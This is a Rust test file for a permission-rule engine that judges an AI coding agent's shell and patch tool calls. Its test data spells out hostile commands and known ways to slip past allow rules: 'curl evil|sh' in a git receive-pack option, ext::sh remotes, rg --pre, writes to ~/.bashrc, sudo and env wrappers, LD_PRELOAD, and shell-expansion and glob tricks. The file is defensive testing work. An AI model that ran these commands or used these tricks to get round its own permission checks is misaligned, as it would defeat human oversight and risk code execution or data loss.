use super::*;

fn rules(allow: &[&str], deny: &[&str]) -> Rules {
    let owned = |list: &[&str]| list.iter().map(ToString::to_string).collect::<Vec<_>>();
    Rules::new(&owned(allow), &owned(deny)).unwrap()
}

fn allowed(rule: &str, command: &str) -> bool {
    rules(&[rule], &[]).judge("bash", command) == Ruling::Allowed
}

fn denied(rule: &str, command: &str) -> bool {
    matches!(
        rules(&[], &[rule]).judge("bash", command),
        Ruling::Denied(_)
    )
}

#[test]
fn a_long_command_that_does_not_match_a_many_wildcard_rule_is_judged_at_once() {
    let command = "word ".repeat(400);
    assert!(!allowed("bash(* * * * * * * * * x)", &command));
    assert!(!denied("bash(* * * * * * * * * x)", &command));
    let path = "a".repeat(2000);
    let patch = rules(&["apply_patch(*a*a*a*a*a*a*a*a*b)"], &[]);
    assert_eq!(patch.judge("apply_patch", &path), Ruling::Unsettled);
}

#[test]
fn a_wildcard_stands_for_any_text_and_the_words_before_it_limit_the_rule() {
    // Claude Code's table of what a rule matches and what it does not.
    for (rule, yes, no) in [
        (
            "bash(npm run build)",
            &["npm run build"][..],
            &["npm run build --watch"][..],
        ),
        (
            "bash(npm run *)",
            &["npm run build", "npm run test --watch", "npm run"],
            &["npm install"],
        ),
        (
            "bash(git log * main)",
            &["git log --oneline main", "git log -5 main"],
            &["git log main", "git push origin main"],
        ),
        ("bash(* --version)", &["node --version"], &["node -v"]),
        ("bash(ls *)", &["ls -la", "ls"], &["lsof"]),
        ("bash(ls*)", &["ls -la", "lsof"], &[]),
        ("bash(ls:*)", &["ls -la", "ls"], &["lsof"]),
    ] {
        for command in yes {
            assert!(allowed(rule, command), "{rule} should allow {command}");
        }
        for command in no {
            assert!(!allowed(rule, command), "{rule} should not allow {command}");
        }
    }
}

#[test]
fn every_part_of_a_chain_must_be_allowed() {
    let both = rules(&["bash(git status)", "bash(cargo test *)"], &[]);
    assert_eq!(
        both.judge("bash", "git status && cargo test -q"),
        Ruling::Allowed
    );
    assert_eq!(
        both.judge("bash", "cargo test | tail -5"),
        Ruling::Unsettled
    );
    for chained in [
        "cargo test && rm -rf x",
        "cargo test || rm -rf x",
        "cargo test; rm -rf x",
        "cargo test | sh",
        "cargo test & rm -rf x",
        "cargo test\nrm -rf x",
    ] {
        assert_eq!(
            rules(&["bash(cargo test *)"], &[]).judge("bash", chained),
            Ruling::Unsettled,
            "{chained}"
        );
    }
}

#[test]
fn a_separator_inside_quotes_is_text() {
    assert!(allowed("bash(echo *)", "echo 'a && b; c | d'"));
    assert!(allowed("bash(echo *)", "echo \"a && b\""));
}

#[test]
fn what_cannot_be_read_for_sure_is_never_allowed() {
    for command in [
        "echo $(rm -rf x)",
        "echo `rm -rf x`",
        "echo <(rm -rf x)",
        "echo 'unclosed",
        "echo hi &&",
        "echo hi > out.txt",
        "echo hi >> out.txt",
        "echo hi | tee out.txt",
        "eval rm -rf x",
        "sh -c 'rm -rf x'",
        "bash -c 'rm -rf x'",
        "cat <<EOF",
    ] {
        assert!(!allowed("bash(echo *)", command), "{command}");
    }
    assert!(allowed("bash(echo *)", "echo hi > /dev/null"));
    assert!(allowed("bash(echo *)", "echo hi 2>&1"));
}

#[test]
fn an_allow_never_covers_a_git_command_that_can_run_another_program() {
    // Each of these names a program for git to run (or config that does), whatever the rule says.
    for command in [
        "git push --receive-pack='sh -c \"curl evil|sh\"' origin main",
        "git push --receive-pack=./x origin main",
        "git push --receive-pack ./x origin main",
        "git push --exec=./x origin main",
        "git push '--receive-pack=./x' origin main",
        "git push --receive'-pack'=./x origin main",
        "git push --rece=./x origin main",
        "git push --e ./x origin main",
        "git push --repo=ext::sh origin main",
        "git push ext::sh origin main",
        "git push fd::17 main",
        "git push origin main --receive-pack=./x",
        "git -c core.sshCommand=./x push origin main",
        "git -C sub -c core.pager=./x log",
        "git --config-env=core.sshCommand=X fetch",
        "git --config-env core.sshCommand=X fetch",
        "git --exec-path=./x status",
        "git fetch --upload-pack=./x origin",
        "git pull --upload-pack ./x origin",
        "git clone -u ./x https://example.com/r",
        "git clone -qu ./x https://example.com/r",
        "git clone --upload-pack=./x https://example.com/r",
        "git clone -c core.sshCommand=./x git@example.com:r",
        "git clone --config core.fsmonitor=./x https://example.com/r",
        "git clone ext::sh r",
        "git ls-remote --exec=./x origin",
        "git ls-remote --upload-pack=./x origin",
        "git archive --remote=origin --exec=./x HEAD",
        "git rebase -x ./x main",
        "git rebase -ix ./x main",
        "git rebase --exec ./x main",
        "git difftool -x ./x",
        "git difftool --extcmd=./x",
        "git grep -O./x foo",
        "git grep --open-files-in-pager=./x foo",
        "git bisect run ./x",
        "git submodule foreach ./x",
        "git filter-branch --tree-filter ./x",
        "git remote add evil ext::sh",
        "git remote set-url origin --push fd::17",
        "timeout 9 git push --receive-pack=./x origin",
        "/usr/bin/git push --receive-pack=./x origin",
        "git status && git push --receive-pack=./x origin",
    ] {
        assert!(!allowed("bash(*git*)", command), "{command}");
        assert!(
            !allowed("bash(git *)", command) && !allowed("bash(/usr/bin/git *)", command),
            "{command}"
        );
        // Asked, not refused: the person (or the mode) still decides.
        assert_eq!(
            rules(&["bash(git *)"], &[]).judge("bash", command),
            Ruling::Unsettled,
            "{command}"
        );
    }
}

#[test]
fn an_ordinary_git_command_is_still_allowed() {
    for command in [
        "git push origin main",
        "git push -u origin feature",
        "git push --force-with-lease origin feature",
        "git push --repo=origin",
        "git fetch -u origin",
        "git fetch --all --prune",
        "git pull --rebase origin main",
        "git clone --depth 1 https://example.com/r dir",
        "git clone -b feature-u https://example.com/r",
        "git cherry-pick -x abc123",
        "git rebase -X theirs main",
        "git rebase --continue",
        "git diff --exit-code origin/main...HEAD",
        "git diff -O orderfile",
        "git log -c --oneline",
        "git log --grep=--exec -S 'context::run'",
        "git commit -m 'mention --exec and ext::x'",
        "git grep -n foo -- src",
        "git -C sub status",
        "git -P log -1",
        "git --no-pager diff",
        "git checkout -- --exec",
        "git bisect start",
        "git submodule update --init",
        "git remote add origin https://example.com/r",
        "git config user.name llx",
    ] {
        assert!(allowed("bash(git *)", command), "{command}");
    }
    assert!(allowed("bash(git push *)", "git push -u origin x"));
    assert!(!allowed(
        "bash(git push *)",
        "git push --receive-pack=./x origin"
    ));
}

#[test]
fn a_shell_told_to_run_a_command_or_find_told_to_write_is_never_allowed() {
    for (rule, command) in [
        ("bash(bash *)", "bash -lc 'rm -rf x'"),
        ("bash(bash *)", "bash -c 'rm -rf x'"),
        ("bash(sh *)", "sh -ec 'rm -rf x'"),
        ("bash(zsh *)", "zsh -ic 'rm -rf x'"),
        ("bash(ksh *)", "ksh -c 'rm -rf x'"),
        ("bash(/bin/sh *)", "/bin/sh -c 'rm -rf x'"),
        ("bash(/usr/bin/tee *)", "/usr/bin/tee out.txt"),
        ("bash(find *)", "find . -fprint0 out.txt"),
        ("bash(/usr/bin/find *)", "/usr/bin/find . -delete"),
    ] {
        assert_eq!(
            rules(&[rule], &[]).judge("bash", command),
            Ruling::Unsettled,
            "{command}"
        );
    }
    for (rule, command) in [
        ("bash(bash *)", "bash script.sh"),
        ("bash(bash *)", "bash -e script.sh"),
        ("bash(bash *)", "bash --version"),
        ("bash(find *)", "find . -name '*.rs' -print0"),
    ] {
        assert!(allowed(rule, command), "{command}");
    }
}

#[test]
fn ripgrep_told_a_program_to_run_is_never_allowed() {
    // `--pre` runs its program on every file searched, `--hostname-bin` once: not what was allowed.
    for command in [
        "rg --pre ./x foo",
        "rg --pre=./x foo",
        "rg '--pre=sh' foo",
        "rg -i --pre ./x --pre-glob '*.pdf' foo",
        "rg --hostname-bin=./x foo",
        "rg --hostname-bin ./x foo",
        "/opt/homebrew/bin/rg --pre ./x foo",
        "timeout 9 rg --pre ./x foo",
        "rg foo src && rg --pre ./x foo",
    ] {
        assert_eq!(
            rules(&["bash(rg *)"], &[]).judge("bash", command),
            Ruling::Unsettled,
            "{command}"
        );
    }
    // `-z` runs the system's decompressors, which the model does not name.
    for command in [
        "rg -n foo src",
        "rg -z foo logs",
        "rg --search-zip foo logs",
        "rg --no-pre foo",
        "rg --pre-glob '*.pdf' foo",
        "rg -- --pre src",
    ] {
        assert!(allowed("bash(rg *)", command), "{command}");
    }
    assert!(denied("bash(rg *)", "rg --pre ./x foo"));
}

#[test]
fn an_allow_never_covers_a_git_command_told_to_write_a_file() {
    // Where it writes is the command's word, not the workspace's: `~/.bashrc` as well.
    for command in [
        "git diff --output=/tmp/x",
        "git diff --output /tmp/x",
        "git log --format=%s --output=$HOME/.bashrc -1",
        "git show HEAD '--output=x'",
        "git log --outp=x",
        "git format-patch -o /tmp/p HEAD~1",
        "git format-patch --output-directory=/tmp/p HEAD~1",
        "git archive -o /tmp/a.tar HEAD",
        "git archive --output=/tmp/a.tar HEAD",
        "git -C sub diff --output=x",
    ] {
        assert_eq!(
            rules(&["bash(git *)"], &[]).judge("bash", command),
            Ruling::Unsettled,
            "{command}"
        );
    }
    for command in [
        "git diff --output-indicator-new=+ HEAD",
        "git grep -o foo",
        "git archive HEAD",
        "git format-patch --stdout HEAD~1",
        "git diff -- --output=x",
        "git log --grep=--output=x",
    ] {
        assert!(allowed("bash(git *)", command), "{command}");
    }
    assert!(denied("bash(git diff *)", "git diff --output=x"));
}

#[test]
fn a_double_dash_taken_as_an_options_value_does_not_end_the_options() {
    // git and ripgrep take the word after an option that wants a value as that value, `--` too,
    // so what follows is still an option: each of these runs a program or writes a file.
    for (rule, command) in [
        ("bash(rg *)", "rg -e -- --pre sh foo"),
        ("bash(rg *)", "rg -g -- --pre=sh foo"),
        ("bash(git *)", "git push -o -- --receive-pack=x ../bare"),
        (
            "bash(git *)",
            "git format-patch --subject-prefix -- -o /tmp/p HEAD~1",
        ),
    ] {
        assert_eq!(
            rules(&[rule], &[]).judge("bash", command),
            Ruling::Unsettled,
            "{command}"
        );
    }
    for (rule, command) in [
        ("bash(rg *)", "rg -e foo -- --pre src"),
        ("bash(rg *)", "rg --glob=*.rs -- --pre src"),
        ("bash(git *)", "git log --grep=x -- --output=x"),
    ] {
        assert!(allowed(rule, command), "{command}");
    }
}

#[test]
fn words_xargs_reads_from_its_input_are_never_allowed_where_an_option_could_run_another() {
    // `xargs` adds what it reads to the command: `--pre sh` from a file, `--output=` from a log.
    for (rule, command) in [
        (
            "bash(rg *)",
            "rg -oN -e '\\-\\-pre' -e sh notes | xargs rg foo",
        ),
        ("bash(rg *)", "xargs timeout 9 rg foo"),
        (
            "bash(git *)",
            "git log -1 --format=--output=x | xargs git diff",
        ),
        ("bash(find *)", "xargs find ."),
        ("bash(sudo *)", "sudo xargs rg foo"),
    ] {
        assert_eq!(
            rules(&[rule], &[]).judge("bash", command),
            Ruling::Unsettled,
            "{command}"
        );
    }
    let both = rules(&["bash(rg *)", "bash(grep *)"], &[]);
    assert_eq!(
        both.judge("bash", "rg -l foo | xargs grep bar"),
        Ruling::Allowed
    );
}

#[test]
fn a_word_the_shell_builds_by_expansion_is_never_allowed() {
    // The shell, not the line, decides these words: each one is `--pre sh` or `--pre=sh` to rg.
    for command in [
        "rg ${X:-'--pre=sh'} foo",
        "rg $'--pre'=sh foo",
        "rg {--pre=sh,} foo",
        "rg {--pre=sh,\"a b\"} foo",
        "rg {--pre=sh,\\ } foo",
        "rg {\"--pre=sh\",x} foo",
        "rg --pre$IFS./x foo",
        "rg \"--pre$@\" sh foo",
        "rg --p\\\nre=sh foo",
        "rg \"--p\\\nre=sh\" foo",
    ] {
        assert_eq!(
            rules(&["bash(rg *)"], &[]).judge("bash", command),
            Ruling::Unsettled,
            "{command}"
        );
    }
    for command in [
        "rg 'a$' src",
        "rg \"foo$\" src",
        "rg 'x{1,2}' src",
        "rg foo$ src",
    ] {
        assert!(allowed("bash(rg *)", command), "{command}");
    }
    assert!(allowed("bash(git *)", "git show HEAD@{1}"));
    assert!(denied("bash(rg *)", "rg ${X:-'--pre=sh'} foo"));
}

#[test]
fn a_glob_the_shell_could_expand_into_an_option_is_never_allowed_where_an_option_runs_another() {
    // The shell puts the workspace's file names in place of `*`, and a pull request can add one
    // named `--pre=sh`, `--output=x` or `-delete`: each would be an option to the program.
    for (rule, command) in [
        ("bash(rg *)", "rg foo *"),
        ("bash(rg *)", "rg foo ?"),
        ("bash(rg *)", "rg foo [-a]*"),
        ("bash(rg *)", "rg foo -* src"),
        ("bash(rg *)", "rg --p* foo"),
        ("bash(rg *)", "rg -e -- * foo"),
        ("bash(rg *)", "timeout 9 rg foo *"),
        ("bash(sudo *)", "sudo rg foo *"),
        ("bash(git *)", "git diff *"),
        ("bash(git diff *)", "git diff HEAD *.rs"),
        ("bash(find *)", "find *"),
        ("bash(find *)", "find . -name *.rs"),
        ("bash(find *)", "find -- *"),
        ("bash(sh *)", "sh *"),
        ("bash(sudo *)", "sudo -* 'rm -rf ~'"),
        ("bash(sudo *)", "sudo *"),
        ("bash(doas *)", "doas b* x"),
        ("bash(timeout *)", "timeout 9 *"),
    ] {
        assert_eq!(
            rules(&[rule], &[]).judge("bash", command),
            Ruling::Unsettled,
            "{command}"
        );
    }
    // Quoted, escaped, after `--`, after a name a file must start with, or for a program whose
    // options run nothing, a glob stays allowed.
    for (rule, command) in [
        ("bash(ls *)", "ls *"),
        ("bash(cat *)", "cat *.md"),
        ("bash(grep *)", "grep foo *"),
        ("bash(sudo *)", "sudo grep foo *"),
        ("bash(rg *)", "rg 'a*' src"),
        ("bash(rg *)", "rg \"x?\" src"),
        ("bash(rg *)", "rg a\\* src"),
        ("bash(rg *)", "rg foo -- *"),
        ("bash(rg *)", "rg foo src/*.rs ./*"),
        ("bash(rg *)", "rg --glob=*.rs foo"),
        ("bash(git *)", "git diff -- *.rs"),
        ("bash(find *)", "find . -name '*.rs'"),
        ("bash([ *)", "[ -f x ]"),
    ] {
        assert!(allowed(rule, command), "{command}");
    }
    assert!(denied("bash(rg *)", "rg foo *"));
    assert!(denied("bash(find *)", "find *"));
}

#[test]
fn wrappers_are_looked_through_but_an_assignment_stops_an_allow() {
    assert!(allowed("bash(npm test *)", "timeout 30 npm test"));
    assert!(allowed("bash(npm test *)", "nice -n 5 npm test"));
    assert!(allowed("bash(grep *)", "xargs grep x"));
    assert!(!allowed("bash(grep *)", "xargs -n1 grep x"));
    assert!(!allowed("bash(npm test *)", "LD_PRELOAD=x.so npm test"));
}

#[test]
fn a_deny_matches_any_part_past_any_assignment() {
    assert!(denied("bash(rm *)", "FOO=bar rm -rf tmp"));
    assert!(denied("bash(rm *)", "echo hi && rm -rf tmp"));
    assert!(denied("bash(rm *)", "echo $(rm -rf tmp)"));
    assert!(denied("bash(git push *)", "timeout 9 git push origin main"));
    assert!(!denied("bash(rm *)", "echo 'rm -rf tmp'"));
}

#[test]
fn a_quoted_or_wrapped_shell_or_git_is_never_allowed_by_a_leading_wildcard() {
    for command in [
        "'sh' -c 'rm -rf x' --version",
        "\"bash\" -c 'rm -rf x' --version",
        "\\sh -c x --version",
        "'/bin/sh' -c x --version",
        "env sh -c x --version",
        "/usr/bin/env sh -c x --version",
        "env -i sh -c x --version",
        "env -S 'sh -c x' --version",
        "env A=1 x --version",
        "sudo sh -c x --version",
        "sudo -u root sh -c x --version",
        "sudo -s x --version",
        "sudo -u root -s x --version",
        "sudo -nu root sh -c x --version",
        "doas -nu root sh -c x --version",
        "sudo -nis x --version",
        "sudo env -S 'sh -c x' --version",
        "sudo LD_PRELOAD=x node --version",
        "nohup sudo env -S 'sh -c x' --version",
        "sudo --login x --version",
        "doas -s x --version",
        "xargs -0 sh -c x --version",
        "command -p sh -c x --version",
        "time -p sh -c x --version",
        "'git' push --receive-pack=x origin --version",
        "env git push --receive-pack=x origin --version",
        "sudo git push --receive-pack=x origin --version",
    ] {
        assert!(!allowed("bash(* --version)", command), "{command}");
    }
    for command in ["node --version", "env node --version", "'node' --version"] {
        assert!(allowed("bash(* --version)", command), "{command}");
    }
}

#[test]
fn an_allow_matches_sudo_as_written() {
    assert!(allowed("bash(sudo apt *)", "sudo apt update"));
    assert!(!allowed("bash(sudo *)", "sudo -s"));
    assert!(!allowed("bash(sudo *)", "sudo env -S 'sh -c x'"));
    assert!(!allowed("bash(sudo *)", "sudo -u root sh -c x"));
    assert!(!allowed("bash(npm test)", "sudo npm test"));
    assert!(!allowed("bash(npm test)", "doas npm test"));
    assert!(allowed("bash(sudo *)", "sudo -usid ls"));
    assert!(allowed("bash(env)", "env"));
    assert!(allowed("bash(command -v *)", "command -v cargo"));
}

#[test]
fn a_deny_sees_the_program_by_its_name_past_quotes_env_sudo_and_doas() {
    for command in [
        "'git' push origin",
        "\"git\" push origin",
        "/usr/bin/git push origin",
        "env git push origin",
        "env -u HOME git push origin",
        "env -S 'git push origin'",
        "sudo git push origin",
        "sudo -u root git push origin",
        "doas -u root git push origin",
        "sudo -nu root git push origin",
        "env -iu HOME git push origin",
        "nice -n 5 sudo env git push origin",
        "timeout -k 5 -s 9 10 git push origin",
    ] {
        assert!(denied("bash(git push *)", command), "{command}");
    }
    for command in [
        "echo git push origin",
        "git commit -m 'git push x'",
        "git pull",
    ] {
        assert!(!denied("bash(git push *)", command), "{command}");
    }
}

#[test]
fn a_deny_names_a_wrapper_or_sudo_as_written() {
    for (rule, command) in [
        ("bash(sudo *)", "sudo rm -rf /"),
        ("bash(sudo *)", "nice -n 5 sudo rm x"),
        ("bash(doas *)", "env doas rm x"),
        ("bash(env *)", "env -i sh"),
        ("bash(timeout *)", "timeout 5 make"),
    ] {
        assert!(denied(rule, command), "{rule} {command}");
    }
    assert!(!denied("bash(sudo *)", "echo sudo rm"));
}

#[test]
fn deny_comes_before_allow() {
    let both = rules(&["bash(git *)"], &["bash(git push *)"]);
    assert_eq!(both.judge("bash", "git status"), Ruling::Allowed);
    assert!(
        matches!(both.judge("bash", "git push"), Ruling::Denied(why) if why.contains("bash(git push *)"))
    );
}

#[test]
fn a_bare_tool_name_matches_every_call_of_it_and_only_of_it() {
    let any = rules(&["bash", "jobs"], &[]);
    assert_eq!(any.judge("bash", "rm -rf $(pwd)"), Ruling::Allowed);
    assert_eq!(any.judge("jobs", ""), Ruling::Allowed);
    assert_eq!(any.judge("apply_patch", "a.md"), Ruling::Unsettled);
    assert_eq!(
        rules(&["Bash(echo *)"], &[]).judge("bash", "echo hi"),
        Ruling::Allowed
    );
}

#[test]
fn a_pattern_needs_a_subject_to_match() {
    // Typing into a terminal session carries no command a pattern could judge.
    assert_eq!(
        rules(&["bash(echo *)"], &[]).judge("bash", ""),
        Ruling::Unsettled
    );
    // `bash(*)` is the bare name, as in Claude Code: every call.
    assert!(matches!(
        rules(&[], &["bash(*)"]).judge("bash", ""),
        Ruling::Denied(_)
    ));
    assert_eq!(
        rules(&["bash(*)"], &[]).judge("bash", "echo $(date)"),
        Ruling::Allowed
    );
}

#[test]
fn an_edit_rule_is_a_glob_from_the_workspace_root() {
    for (rule, yes, no) in [
        (
            "apply_patch(docs/**)",
            &["docs/a.md", "docs/x/y.md"][..],
            &["src/docs/a.md", "a.md"][..],
        ),
        ("apply_patch(*.md)", &["a.md", "docs/a.md"], &["a.rs"]),
        ("apply_patch(src/*.rs)", &["src/a.rs"], &["src/x/a.rs"]),
        (
            "apply_patch(CHANGELOG.md)",
            &["CHANGELOG.md"],
            &["docs/CHANGELOG.md.bak"],
        ),
    ] {
        let judged = rules(&[rule], &[]);
        for path in yes {
            assert_eq!(
                judged.judge("apply_patch", path),
                Ruling::Allowed,
                "{rule} {path}"
            );
        }
        for path in no {
            assert_eq!(
                judged.judge("apply_patch", path),
                Ruling::Unsettled,
                "{rule} {path}"
            );
        }
    }
    assert_eq!(
        rules(&["apply_patch(docs/**)"], &[]).judge("apply_patch", "docs/../src/a.rs"),
        Ruling::Unsettled
    );
}

#[test]
fn a_rule_that_cannot_be_read_says_which() {
    for rule in [
        "bash(echo *",
        "nosuchtool",
        "apply_patch(//etc/**)",
        "apply_patch(~/x)",
        "apply_patch(../x)",
        "bash()",
        "",
    ] {
        let error = Rules::new(&[rule.to_string()], &[]).unwrap_err();
        assert!(error.contains(&format!("`{rule}`")), "{rule}: {error}");
    }
}

#[test]
fn the_rules_read_back_for_the_model() {
    assert_eq!(rules(&[], &[]).describe(), None);
    let text = rules(&["bash(cargo test *)"], &["bash(git push *)"])
        .describe()
        .unwrap();
    assert!(
        text.contains("bash(cargo test *)") && text.contains("bash(git push *)"),
        "{text}"
    );
}

#[test]
fn a_tool_allowed_whole_is_not_held_to_a_pattern() {
    let text = rules(&["bash", "jobs"], &[]).describe().unwrap();
    assert!(text.contains("whatever they do: `bash`, `jobs`"), "{text}");
    assert!(!text.contains("every part"), "{text}");
    let mixed = rules(&["jobs", "bash(cargo test *)"], &[])
        .describe()
        .unwrap();
    assert!(mixed.contains("whatever they do: `jobs`"), "{mixed}");
    assert!(
        mixed.contains("`bash(cargo test *)`") && mixed.contains("every part"),
        "{mixed}"
    );
    assert!(!rules(&["bash", "jobs"], &[]).allows_every_tool());
    assert!(rules(&["bash", "apply_patch", "jobs"], &[]).allows_every_tool());
    assert!(!rules(&["bash(cargo *)", "apply_patch", "jobs"], &[]).allows_every_tool());
}
